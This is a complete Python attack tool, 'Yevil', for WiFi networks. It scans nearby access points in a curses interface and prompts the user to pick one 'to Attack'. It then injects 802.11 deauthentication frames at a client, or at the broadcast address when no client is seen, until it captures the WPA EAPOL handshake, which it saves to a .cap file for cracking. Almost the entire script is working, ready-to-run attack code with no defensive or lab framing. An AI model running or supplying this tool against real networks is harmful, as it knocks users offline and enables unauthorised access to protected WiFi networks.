#!/usr/bin/env python3
"""
Yevil - Real‑time WiFi Scanner & Automated Handshake Capture Tool v3.0.0
- Responsive Curses TUI scanner (no screen tearing or overlapping).
- Post-scan static AP selection menu.
- Locks channel & runs targeted packet sniffer (EAPOL validation).
- Transmits deauth frames until WPA handshake is captured and saved.
"""

import os
import sys
import subprocess
import re
import time
import signal
import glob
import curses
from threading import Thread, Event
from collections import defaultdict

# Scapy Imports
from scapy.all import (
    RadioTap,
    Dot11,
    Dot11Deauth,
    EAPOL,
    sniff,
    sendp,
    wrpcap
)

# ============================================
# GLOBALS & STATE
# ============================================

MONITOR_INTERFACE = None
SCANNER_PROCESS = None
CSV_PREFIX = "/tmp/yevil_scan"
OUTPUT_CAP = "handshake_capture.cap"

networks = {}               # bssid -> {ssid, bssid, power, channel, encryption}
clients = defaultdict(set)  # bssid -> set of station MACs

handshake_captured = False
captured_packets = []

# ============================================
# CLEANUP & SYSTEM UTILITIES
# ============================================

def cleanup_files():
    """Removes temporary CSV scan files."""
    for f in glob.glob(f"{CSV_PREFIX}*"):
        try:
            os.remove(f)
        except:
            pass


def cleanup():
    """Terminates background scanner and cleans up temp files."""
    global SCANNER_PROCESS
    if SCANNER_PROCESS:
        try:
            SCANNER_PROCESS.terminate()
            time.sleep(0.3)
            if SCANNER_PROCESS.poll() is None:
                SCANNER_PROCESS.kill()
        except:
            pass
        SCANNER_PROCESS = None

    cleanup_files()


def reset_adapter():
    """Restores wireless interface back to managed mode."""
    global MONITOR_INTERFACE
    if MONITOR_INTERFACE:
        try:
            print(f"[*] Restoring {MONITOR_INTERFACE} to managed mode...")
            subprocess.run(['ip', 'link', 'set', MONITOR_INTERFACE, 'down'], capture_output=True)
            subprocess.run(['iw', 'dev', MONITOR_INTERFACE, 'set', 'type', 'managed'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', MONITOR_INTERFACE, 'up'], capture_output=True)
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
            print("[+] Adapter successfully restored.")
        except:
            pass


def detect_adapters():
    """Detects available wireless interfaces."""
    adapters = []
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                adapter = line.split()[0]
                if adapter not in adapters:
                    adapters.append(adapter)
    except:
        pass
    return adapters


def set_monitor_mode(adapter):
    """Puts selected wireless interface into monitor mode."""
    global MONITOR_INTERFACE
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
        subprocess.run(['ip', 'link', 'set', adapter, 'down'], check=True, capture_output=True)
        subprocess.run(['iw', 'dev', adapter, 'set', 'type', 'monitor'], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', adapter, 'up'], check=True, capture_output=True)
        MONITOR_INTERFACE = adapter
        return True
    except Exception:
        return False

# ============================================
# CSV PARSER
# ============================================

def parse_csv_file(csv_file):
    """Parses airodump-ng output CSV to extract clean AP and Client details."""
    global networks, clients
    if not os.path.exists(csv_file):
        return

    temp_nets = {}
    temp_clients = defaultdict(set)

    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        parsing_stations = False

        for line in lines:
            line = line.strip()
            if not line:
                continue

            if line.startswith("Station MAC"):
                parsing_stations = True
                continue

            parts = [p.strip() for p in line.split(',')]

            if not parsing_stations:
                if len(parts) >= 14 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    bssid = parts[0]
                    power = parts[8]
                    channel = parts[3]
                    privacy = parts[5]
                    ssid = parts[13]

                    if not ssid or ssid == "":
                        ssid = "<Hidden>"

                    temp_nets[bssid] = {
                        'bssid': bssid,
                        'power': power,
                        'channel': channel,
                        'encryption': privacy,
                        'ssid': ssid
                    }
            else:
                if len(parts) >= 6 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    client_mac = parts[0]
                    associated_bssid = parts[5]
                    if re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', associated_bssid):
                        temp_clients[associated_bssid].add(client_mac)

        networks = temp_nets
        clients = temp_clients
    except Exception:
        pass

# ============================================
# CURSES TUI (LIVE DISPLAY ENGINE)
# ============================================

def curses_display(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(400)

    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_GREEN, -1)   # Strong
    curses.init_pair(2, curses.COLOR_YELLOW, -1)  # Medium
    curses.init_pair(3, curses.COLOR_RED, -1)     # Weak
    curses.init_pair(4, curses.COLOR_CYAN, -1)    # Headers

    target_csv = f"{CSV_PREFIX}-01.csv"

    while True:
        key = stdscr.getch()
        if key in (ord('q'), ord('Q'), ord('s'), ord('S'), 3):
            break

        parse_csv_file(target_csv)
        stdscr.erase()

        max_y, max_x = stdscr.getmaxyx()
        essid_width = max(10, max_x - 56)

        title = "=== YEVIL - REAL-TIME WI-FI SCANNER ==="
        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title[:max_x-1], curses.color_pair(4) | curses.A_BOLD)

        header = f"{'#':<3} {'ESSID':<{essid_width}} {'CH':<4} {'ENCR':<7} {'POWER':<7} {'CLI':<5} {'BSSID'}"
        stdscr.addstr(2, 0, header[:max_x - 1], curses.color_pair(4) | curses.A_BOLD)
        stdscr.addstr(3, 0, "-" * max(0, max_x - 1), curses.color_pair(4))

        def get_power(net):
            try:
                return int(net['power'])
            except:
                return -100

        sorted_nets = sorted(networks.values(), key=get_power, reverse=True)

        row_idx = 4
        for idx, net in enumerate(sorted_nets, 1):
            if row_idx >= max_y - 2:
                break

            try:
                pwr = int(net['power'])
                color = curses.color_pair(1) if pwr > -60 else curses.color_pair(2) if pwr > -75 else curses.color_pair(3)
            except:
                color = curses.color_pair(0)

            ssid = net['ssid'][:essid_width-1]
            client_count = len(clients.get(net['bssid'], set()))
            pwr_str = f"{net['power']}dB" if net['power'].lstrip('-').isdigit() else net['power']

            line = f"{idx:<3} {ssid:<{essid_width}} {net['channel']:<4} {net['encryption']:<7} {pwr_str:<7} {client_count:<5} {net['bssid']}"
            stdscr.addstr(row_idx, 0, line[:max_x - 1], color)
            row_idx += 1

        footer = "Press 's' or 'q' to stop scanning and select target AP."
        stdscr.addstr(max_y - 1, 0, footer[:max_x - 1], curses.color_pair(4) | curses.A_REVERSE)

        stdscr.refresh()

# ============================================
# PACKET SNIFFER & DEAUTH ENGINE
# ============================================

def packet_handler(pkt, target_bssid):
    """Processes captured frames to detect EAPOL (WPA Handshake) packets."""
    global handshake_captured, captured_packets
    
    captured_packets.append(pkt)

    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        addr1 = str(pkt[Dot11].addr1).lower()
        addr2 = str(pkt[Dot11].addr2).lower()
        if target_bssid.lower() in [addr1, addr2]:
            print(f"\n\033[92m[!] SUCCESS: WPA EAPOL Handshake captured for {target_bssid}!\033[0m")
            handshake_captured = True


def run_deauth_capture(iface, bssid, client_mac):
    """Controls the packet sniffer thread and deauth packet injection."""
    global handshake_captured, captured_packets
    handshake_captured = False
    captured_packets = []

    print(f"\n\033[96m[*] Starting Packet Sniffer on {iface} for BSSID: {bssid}...\033[0m")

    # Start background packet capture
    sniffer_thread = Thread(
        target=lambda: sniff(
            iface=iface,
            prn=lambda p: packet_handler(p, bssid),
            stop_filter=lambda x: handshake_captured,
            timeout=120
        ),
        daemon=True
    )
    sniffer_thread.start()
    time.sleep(1)

    # Craft 802.11 Deauthentication Frame
    deauth_frame = (
        RadioTap() /
        Dot11(type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=7)
    )

    attempts = 0
    max_attempts = 10

    while not handshake_captured and attempts < max_attempts:
        attempts += 1
        print(f"[*] Attempt {attempts}/{max_attempts}: Sending Deauth burst to {client_mac}...")
        
        # Inject deauth frames
        sendp(deauth_frame, iface=iface, count=5, inter=0.05, verbose=False)
        
        print("[*] Waiting 6 seconds for client reconnection & EAPOL handshake...")
        time.sleep(6)

    if handshake_captured:
        wrpcap(OUTPUT_CAP, captured_packets)
        print(f"\n\033[92m[+] Handshake saved successfully to '{OUTPUT_CAP}'\033[0m")
    else:
        print("\n\033[91m[-] Timed out without capturing a complete handshake.\033[0m")

# ============================================
# MAIN EXECUTION PIPELINE
# ============================================

def main():
    if os.geteuid() != 0:
        print("\033[91m[-] This tool requires root privileges! Run with: sudo python3 yevil.py\033[0m")
        sys.exit(1)

    adapters = detect_adapters()
    if not adapters:
        print("\033[91m[-] No wireless adapters detected!\033[0m")
        sys.exit(1)

    print("\n📋 \033[96mAvailable Wireless Adapters:\033[0m")
    for i, adapter in enumerate(adapters, 1):
        print(f"  {i}. {adapter}")

    while True:
        try:
            choice = input("\n[?] Select adapter number: ")
            selected = adapters[int(choice) - 1]
            break
        except (IndexError, ValueError):
            print("\033[91m[-] Invalid selection!\033[0m")

    print(f"[*] Setting {selected} into monitor mode...")
    if not set_monitor_mode(selected):
        print("\033[91m[-] Failed to set monitor mode.\033[0m")
        sys.exit(1)

    cleanup_files()

    # Launch background scanning process
    cmd = [
        'airodump-ng', selected,
        '--band', 'abg',
        '--write', CSV_PREFIX,
        '--output-format', 'csv'
    ]

    global SCANNER_PROCESS
    SCANNER_PROCESS = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[*] Launching Real-time Interface...")
    time.sleep(1)

    # Step 1: Real-time Scanning UI
    try:
        curses.wrapper(curses_display)
    except (KeyboardInterrupt, Exception):
        pass
    finally:
        cleanup()

    if not networks:
        print("\n\033[91m[-] No networks discovered.\033[0m")
        sys.exit(0)

    # Step 2: Target Selection Menu
    term_width = os.get_terminal_size().columns
    essid_width = max(10, term_width - 56)

    def get_power(net):
        try:
            return int(net['power'])
        except:
            return -100

    sorted_nets = sorted(networks.values(), key=get_power, reverse=True)

    print("\n\033[96m" + "=" * term_width)
    print("TARGET AP SELECTION".center(term_width))
    print("=" * term_width + "\033[0m")

    header = f"{'#':<3} {'ESSID':<{essid_width}} {'CH':<4} {'POWER':<7} {'ENCR':<7} {'CLI':<5} {'BSSID'}"
    print(f"\033[1m\033[93m{header[:term_width]}\033[0m")
    print("\033[96m" + "-" * term_width + "\033[0m")

    for idx, net in enumerate(sorted_nets, 1):
        ssid = net['ssid'][:essid_width-1]
        pwr_str = f"{net['power']}dB" if net['power'].lstrip('-').isdigit() else net['power']
        client_count = len(clients.get(net['bssid'], set()))
        
        try:
            pwr = int(net['power'])
            color_code = '\033[92m' if pwr > -60 else '\033[93m' if pwr > -75 else '\033[91m'
        except:
            color_code = '\033[97m'

        line = f"{idx:<3} {ssid:<{essid_width}} {net['channel']:<4} {pwr_str:<7} {net['encryption']:<7} {client_count:<5} {net['bssid']}"
        print(f"{color_code}{line[:term_width]}\033[0m")

    print("\033[96m" + "=" * term_width + "\033[0m\n")

    # Prompt User for Target AP Selection
    while True:
        try:
            ap_choice = input("[?] Enter Target AP Number to Attack (or 'q' to quit): ").strip()
            if ap_choice.lower() == 'q':
                sys.exit(0)
            target_ap = sorted_nets[int(ap_choice) - 1]
            break
        except (IndexError, ValueError):
            print("\033[91m[-] Invalid AP number.\033[0m")

    target_bssid = target_ap['bssid']
    target_channel = target_ap['channel']
    target_ssid = target_ap['ssid']

    print(f"\n\033[92m[+] Locked Target: {target_ssid} ({target_bssid}) on Channel {target_channel}\033[0m")

    # Step 3: Lock Interface to Target AP Channel
    subprocess.run(['iw', 'dev', MONITOR_INTERFACE, 'set', 'channel', str(target_channel)],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Step 4: Choose Target Client MAC
    available_clients = list(clients.get(target_bssid, set()))
    if available_clients:
        target_client = available_clients[0]
        print(f"[+] Targeted Active Client MAC: {target_client}")
    else:
        target_client = "ff:ff:ff:ff:ff:ff"
        print("[!] No active client detected in scan. Using Broadcast MAC (FF:FF:FF:FF:FF:FF).")

    # Step 5: Execute Packet Sniffer & Deauth Loop
    try:
        run_deauth_capture(MONITOR_INTERFACE, target_bssid, target_client)
    except KeyboardInterrupt:
        print("\n\033[93m[!] Attack aborted by user.\033[0m")

    # Step 6: Reset Adapter Option
    print()
    reset_choice = input("[?] Restore adapter to normal managed mode? (y/n): ")
    if reset_choice.lower() == 'y':
        reset_adapter()


if __name__ == "__main__":
    main()
